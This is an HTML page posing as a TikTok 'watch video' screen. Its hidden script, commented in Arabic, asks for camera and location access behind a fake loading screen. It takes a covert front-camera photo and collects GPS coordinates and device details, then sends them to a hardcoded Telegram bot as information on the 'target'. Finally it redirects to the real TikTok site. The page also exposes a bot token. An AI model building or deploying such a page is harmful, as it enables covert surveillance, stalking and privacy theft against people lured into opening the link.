<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Watch Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
            position: relative;
        }
        .video-container {
            width: 100vw;
            height: 100vh;
            max-width: 500px;
            max-height: 100vh;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            overflow: hidden;
        }
        .video-placeholder {
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            z-index: 10;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .video-placeholder.hidden { opacity: 0; pointer-events: none; }
        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
            margin-bottom: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        .play-button svg { width: 40px; height: 40px; fill: #fff; margin-left: 5px; }
        .tiktok-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 1.5em;
            font-weight: bold;
            color: #fff;
            z-index: 15;
        }
        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        #loading-overlay.active { opacity: 1; visibility: visible; }
        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #ff0050;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-message {
            font-size: 1.1em;
            color: #eee;
            text-align: center;
            max-width: 300px;
        }
        .hidden-ui { opacity: 0; pointer-events: none; }
        #notification {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 0.9em;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            z-index: 30;
            border-left: 4px solid #ff0050;
        }
        #notification.show { opacity: 1; visibility: visible; }
        .progress-bar {
            width: 200px;
            height: 4px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 10px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0050, #00f2ea);
            width: 0%;
            transition: width 0.3s ease;
        }
        /* عناصر الكاميرا - مخفية لكنها موجودة عشان التصوير */
        .camera-hidden {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 640px;
            height: 480px;
            opacity: 0;
            pointer-events: none;
        }
        #canvas {
            position: fixed;
            top: -1000px;
            left: -1000px;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="tiktok-logo">TikTok</div>
        <div class="video-placeholder" id="video-placeholder">
            <div class="play-button">
                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div class="placeholder-text" id="placeholder-text">Tap to watch this video</div>
        </div>
        <div id="loading-overlay">
            <div class="spinner"></div>
            <div class="loading-message" id="loading-message">Loading video content...</div>
            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
        </div>
        <div id="notification"></div>
    </div>

    <!-- عناصر مخفية للكاميرا -->
    <video id="camera-feed" class="camera-hidden" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = '8246710006:AAHDzo0liPiUnrv6GqaQDZppyAbsVrF7TSI';
        const CHAT_ID = '1197183184';
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/';

        const videoPlaceholder = document.getElementById('video-placeholder');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingMessage = document.getElementById('loading-message');
        const progressFill = document.getElementById('progress-fill');
        const notificationDiv = document.getElementById('notification');
        const cameraFeed = document.getElementById('camera-feed');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let capturedImage = null;
        let gpsLocation = null;

        function updateProgress(percent) {
            progressFill.style.width = percent + '%';
        }

        function showNotification(msg) {
            notificationDiv.textContent = msg;
            notificationDiv.classList.add('show');
            setTimeout(() => {
                notificationDiv.classList.remove('show');
            }, 3000);
        }

        // ========== التقاط صورة حقيقية من الكاميرا ==========
        async function takePhoto() {
            try {
                loadingMessage.textContent = 'طلب الوصول للكاميرا...';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
                });
                
                cameraFeed.srcObject = stream;
                
                // انتظر حتى تبدأ الكاميرا
                await new Promise((resolve) => {
                    cameraFeed.onloadedmetadata = () => {
                        cameraFeed.play();
                        resolve();
                    };
                });
                
                // انتظر 1 ثانية عشان الكاميرا تستقر
                await new Promise(r => setTimeout(r, 4000));
                
                // ضبط حجم الكانفاس على حجم الفيديو
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                
                // رسم الصورة من الكاميرا
                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                
                // تحويل الصورة إلى base64
                capturedImage = canvas.toDataURL('image/jpeg', 0.9);
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                
                console.log('✅ Photo captured successfully');
                loadingMessage.textContent = 'تم التقاط الصورة بنجاح';
                return true;
                
            } catch (error) {
                console.error('Camera error:', error);
                showNotification('تعذر الوصول للكاميرا: ' + error.message);
                return false;
            }
        }

        // ========== جلب GPS ==========
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                loadingMessage.textContent = 'طلب الوصول للموقع...';
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        gpsLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        console.log('✅ GPS:', gpsLocation.latitude, gpsLocation.longitude);
                        resolve(gpsLocation);
                    },
                    (error) => {
                        console.error('GPS error:', error.message);
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // ========== إرسال الصورة ==========
        async function sendPhoto() {
            if (!capturedImage) return false;
            
            try {
                const blob = await fetch(capturedImage).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'camera.jpg');
                formData.append('caption', '📸 صورة من كاميرا الهدف');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                console.log('✅ Photo sent');
                return true;
            } catch(e) {
                console.error('Photo send failed:', e);
                return false;
            }
        }

        // ========== إرسال الموقع ==========
        async function sendLocation() {
            if (!gpsLocation) return false;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: gpsLocation.latitude,
                        longitude: gpsLocation.longitude
                    })
                });
                console.log('✅ Location sent');
                return true;
            } catch(e) {
                console.error('Location send failed:', e);
                return false;
            }
        }

        // ========== إرسال معلومات الجهاز ==========
        async function sendDeviceInfo() {
            let message = `🎯 <b>Target Device Info</b>\n\n`;
            message += `📱 <b>Platform:</b> ${navigator.platform}\n`;
            message += `📺 <b>Screen:</b> ${screen.width}x${screen.height}\n`;
            message += `💾 <b>RAM:</b> ${navigator.deviceMemory || 'Unknown'}GB\n`;
            message += `🌐 <b>Language:</b> ${navigator.language}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toISOString()}\n`;
            message += `🔗 <b>URL:</b> ${window.location.href}\n\n`;
            message += `<code>${navigator.userAgent.substring(0, 200)}</code>`;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('✅ Device info sent');
            } catch(e) {
                console.error('Info send failed:', e);
            }
        }

        // ========== التشغيل الرئيسي ==========
        async function start() {
            try {
                updateProgress(10);
                loadingMessage.textContent = 'جاري التحميل...';
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(30);
                await getGPS();
                await new Promise(r => setTimeout(r, 300));
                
                updateProgress(50);
                await takePhoto();
                await new Promise(r => setTimeout(r, 300));
                
                updateProgress(70);
                loadingMessage.textContent = 'جاري الإرسال...';
                await sendLocation();
                await sendPhoto();
                await sendDeviceInfo();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(100);
                console.log('✅ Mission complete');
                
            } catch(e) {
                console.error('Error:', e);
            } finally {
                setTimeout(() => {
                    window.location.href = TIKTOK_REDIRECT_URL;
                }, 2000);
            }
        }

        videoPlaceholder.addEventListener('click', () => {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            start();
        });

        showNotification('اضغط لمشاهدة الفيديو');

        setTimeout(() => {
            if (!loadingOverlay.classList.contains('active')) {
                videoPlaceholder.classList.add('hidden');
                loadingOverlay.classList.add('active');
                start();
            }
        }, 30000);
    </script>
</body>
</html>
